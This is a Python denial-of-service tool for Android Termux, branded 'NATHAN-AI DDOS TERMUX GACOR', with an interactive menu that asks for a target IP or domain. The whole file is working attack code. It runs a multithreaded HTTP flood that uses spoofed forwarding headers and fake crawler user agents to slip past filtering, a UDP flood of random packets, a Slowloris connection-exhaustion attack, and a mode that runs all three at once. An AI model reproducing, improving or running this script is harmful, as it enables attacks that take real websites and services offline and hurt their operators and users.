#!/data/data/com.termux/files/usr/bin/python3
"""
NATHAN-AI DDOS TERMUX GACOR
Optimized for Android Termux
"""

import socket
import threading
import random
import time
import sys
import os

# Banner
print("""\033[1;31m
╔══════════════════════════════════════════╗
║     NATHAN-AI DDOS TERMUX GACOR         ║
║         MAX POWER FOR ANDROID           ║
╚══════════════════════════════════════════╝
\033[0m""")

class TermuxDDoS:
    def __init__(self):
        self.running = False
        self.threads = []
        self.packets = 0
        self.bytes_sent = 0
        
    def super_flood(self, target, port=80, threads=1000, duration=120):
        """SUPER FLOOD - Maximum Power"""
        print(f"\033[1;32m[+] Target: {target}:{port}")
        print(f"[+] Threads: {threads}")
        print(f"[+] Duration: {duration}s")
        print(f"[+] Method: SUPER FLOOD\033[0m")
        
        # High performance user agents
        user_agents = [
            "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0",
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        ]
        
        # Attack vectors
        attack_vectors = [
            "GET /?{} HTTP/1.1\r\n",
            "POST /login HTTP/1.1\r\n",
            "HEAD / HTTP/1.1\r\n",
            "OPTIONS / HTTP/1.1\r\n"
        ]
        
        def super_attacker(thread_id):
            while self.running:
                try:
                    # Multiple socket types
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target, port))
                    
                    # Randomize everything
                    vector = random.choice(attack_vectors)
                    ua = random.choice(user_agents)
                    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    
                    # Craft powerful request
                    request = vector.format(random.randint(1000, 9999))
                    request += f"Host: {target}\r\n"
                    request += f"User-Agent: {ua}\r\n"
                    request += f"X-Forwarded-For: {fake_ip}\r\n"
                    request += f"X-Real-IP: {fake_ip}\r\n"
                    request += f"CF-Connecting-IP: {fake_ip}\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    request += "Accept-Language: en-US,en;q=0.5\r\n"
                    request += "Accept-Encoding: gzip, deflate\r\n"
                    request += "Cache-Control: no-cache\r\n"
                    request += "Pragma: no-cache\r\n"
                    
                    # Add random headers
                    for _ in range(random.randint(5, 15)):
                        request += f"X-Random-{random.randint(1,100)}: {random.randint(1000, 9999)}\r\n"
                    
                    request += "\r\n"
                    
                    # Send with random data
                    s.send(request.encode())
                    
                    # Send additional random data
                    if random.random() > 0.5:
                        random_data = os.urandom(random.randint(100, 5000))
                        s.send(random_data)
                    
                    self.packets += 1
                    self.bytes_sent += len(request)
                    s.close()
                    
                    # Aggressive mode - no delay
                    # time.sleep(0.001)
                    
                except Exception as e:
                    continue
        
        # Start attack
        self.running = True
        start_time = time.time()
        
        print("\033[1;33m[+] Creating attack threads...\033[0m")
        
        # Create threads
        for i in range(threads):
            try:
                t = threading.Thread(target=super_attacker, args=(i,))
                t.daemon = True
                t.start()
                self.threads.append(t)
                if i % 100 == 0:
                    print(f"\r[+] Threads created: {i}", end="")
            except:
                continue
        
        print(f"\n\033[1;32m[+] {len(self.threads)} threads activated!\033[0m")
        print("\033[1;33m[+] ATTACK STARTED! Press Ctrl+C to stop\033[0m")
        
        # Attack monitor
        try:
            while time.time() - start_time < duration and self.running:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    speed = self.packets / elapsed
                    mb_sent = self.bytes_sent / (1024 * 1024)
                    
                    sys.stdout.write(f"\r\033[1;36m[+] Time: {elapsed:.1f}s | Packets: {self.packets} | Speed: {speed:.0f}/s | Data: {mb_sent:.2f} MB\033[0m")
                    sys.stdout.flush()
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Stopping attack...\033[0m")
        
        self.stop_attack()
        
    def udp_megablast(self, target, port=53, duration=90):
        """UDP MEGABLAST - High Bandwidth"""
        print(f"\033[1;32m[+] UDP Megablast on {target}:{port}\033[0m")
        
        def udp_attacker():
            while self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Large random packets
                    packet_size = random.randint(500, 1400)  # MTU size
                    data = os.urandom(packet_size)
                    
                    # Send to multiple ports
                    target_port = port if port != 0 else random.randint(1, 65535)
                    s.sendto(data, (target, target_port))
                    
                    self.packets += 1
                    self.bytes_sent += packet_size
                    s.close()
                    
                except Exception:
                    continue
        
        self.running = True
        start_time = time.time()
        
        # Create 500 UDP threads
        for i in range(500):
            t = threading.Thread(target=udp_attacker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Monitor
        try:
            while time.time() - start_time < duration and self.running:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    mb_sent = self.bytes_sent / (1024 * 1024)
                    speed = self.packets / elapsed
                    print(f"\r\033[1;35m[+] UDP Blast: {elapsed:.1f}s | Packets: {self.packets} | Speed: {speed:.0f}/s | Data: {mb_sent:.2f} MB\033[0m", end="")
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        
        self.stop_attack()
    
    def slowloris_pro(self, target, port=80, sockets=500, duration=300):
        """SLOWLORIS PRO - Keep connections alive"""
        print(f"\033[1;32m[+] Slowloris Pro on {target}:{port}\033[0m")
        
        connections = []
        
        # Create sockets
        print("[+] Creating sockets...")
        for i in range(sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                
                # Send partial request
                s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Connection: keep-alive\r\n".encode())
                s.send("Accept: text/html\r\n".encode())
                
                connections.append(s)
                
                if i % 50 == 0:
                    print(f"\r[+] Sockets: {len(connections)}", end="")
                    
            except Exception:
                continue
        
        print(f"\n[+] {len(connections)} sockets connected")
        
        self.running = True
        start_time = time.time()
        
        # Keep connections alive
        try:
            while time.time() - start_time < duration and self.running:
                for s in connections:
                    try:
                        # Send keep-alive headers
                        header = f"X-{random.randint(1000,9999)}: {random.randint(1,99999)}\r\n"
                        s.send(header.encode())
                        self.packets += 1
                    except Exception:
                        # Try to reconnect
                        try:
                            s.close()
                            connections.remove(s)
                            
                            ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ns.settimeout(4)
                            ns.connect((target, port))
                            ns.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                            connections.append(ns)
                        except Exception:
                            continue
                
                elapsed = time.time() - start_time
                print(f"\r\033[1;33m[+] Slowloris: {elapsed:.1f}s | Sockets: {len(connections)} | Packets: {self.packets}\033[0m", end="")
                time.sleep(random.randint(5, 15))  # Random interval
                
        except KeyboardInterrupt:
            pass
        
        # Cleanup
        for s in connections:
            try:
                s.close()
            except:
                pass
        
        self.running = False
        print(f"\n[+] Slowloris stopped")
    
    def mixed_attack(self, target, duration=180):
        """MIXED ATTACK - All methods combined"""
        print(f"\033[1;31m[+] STARTING MIXED ATTACK ON {target}\033[0m")
        print("[+] Deploying all attack vectors...")
        
        # Start all attacks in threads
        t1 = threading.Thread(target=self.super_flood, args=(target, 80, 800, duration))
        t2 = threading.Thread(target=self.udp_megablast, args=(target, 53, duration))
        t3 = threading.Thread(target=self.slowloris_pro, args=(target, 80, 300, duration))
        
        t1.start()
        t2.start()
        t3.start()
        
        print("\033[1;33m[+] ALL ATTACKS DEPLOYED!")
        print(f"[+] Attack will run for {duration} seconds")
        print("[+] Press Ctrl+C to stop early\033[0m")
        
        # Wait for completion
        try:
            t1.join()
            t2.join()
            t3.join()
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop all attacks"""
        self.running = False
        time.sleep(2)
        
        elapsed = time.time() - getattr(self, 'start_time', 0)
        mb_sent = self.bytes_sent / (1024 * 1024) if self.bytes_sent > 0 else 0
        
        print(f"\n\n\033[1;32m{'='*50}")
        print(f"[+] ATTACK COMPLETED")
        print(f"{'='*50}")
        print(f"[+] Total Packets: {self.packets}")
        print(f"[+] Total Data: {mb_sent:.2f} MB")
        print(f"[+] Attack Duration: {elapsed:.1f}s")
        
        if elapsed > 0:
            print(f"[+] Average Speed: {self.packets/elapsed:.0f} packets/s")
            print(f"[+] Bandwidth: {(mb_sent*8)/elapsed:.2f} Mbps")
        
        print(f"{'='*50}\033[0m")
    
    def menu(self):
        """Display menu"""
        while True:
            print("""\033[1;36m
╔════════════════════════════════════╗
║     NATHAN-AI DDOS TERMUX GACOR    ║
╠════════════════════════════════════╣
║ 1. SUPER FLOOD (Max Power)         ║
║ 2. UDP MEGABLAST (High Bandwidth)  ║
║ 3. SLOWLORIS PRO (Connection Kill) ║
║ 4. MIXED ATTACK (All Methods)      ║
║ 5. STOP ATTACK                     ║
║ 6. EXIT                            ║
╚════════════════════════════════════╝\033[0m""")
            
            choice = input("\n\033[1;37mSelect option (1-6): \033[0m")
            
            if choice == "1":
                target = input("Target IP/Domain: ")
                port = int(input("Port (default 80): ") or "80")
                threads = int(input("Threads (500-1500): ") or "1000")
                duration = int(input("Duration seconds: ") or "120")
                
                self.super_flood(target, port, threads, duration)
                
            elif choice == "2":
                target = input("Target IP: ")
                port = int(input("Port (default 53): ") or "53")
                duration = int(input("Duration seconds: ") or "90")
                
                self.udp_megablast(target, port, duration)
                
            elif choice == "3":
                target = input("Target IP: ")
                port = int(input("Port (default 80): ") or "80")
                sockets = int(input("Sockets (200-800): ") or "500")
                duration = int(input("Duration seconds: ") or "300")
                
                self.slowloris_pro(target, port, sockets, duration)
                
            elif choice == "4":
                target = input("Target IP: ")
                duration = int(input("Duration seconds: ") or "180")
                
                self.mixed_attack(target, duration)
                
            elif choice == "5":
                self.stop_attack()
                print("[+] All attacks stopped")
                
            elif choice == "6":
                self.stop_attack()
                print("\033[1;31m[+] Exiting...\033[0m")
                sys.exit(0)
                
            else:
                print("\033[1;31m[!] Invalid choice\033[0m")

# Main execution
if __name__ == "__main__":
    # Check if running in Termux
    if not os.path.exists("/data/data/com.termux"):
        print("\033[1;31m[!] This script is optimized for Termux!")
        print("[!] Running anyway...\033[0m")
    
    # Create tool instance
    tool = TermuxDDoS()
    
    # Check for command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "--attack":
            target = sys.argv[2] if len(sys.argv) > 2 else input("Target: ")
            tool.super_flood(target, threads=1200, duration=150)
        else:
            tool.menu()
    else:
        tool.menu()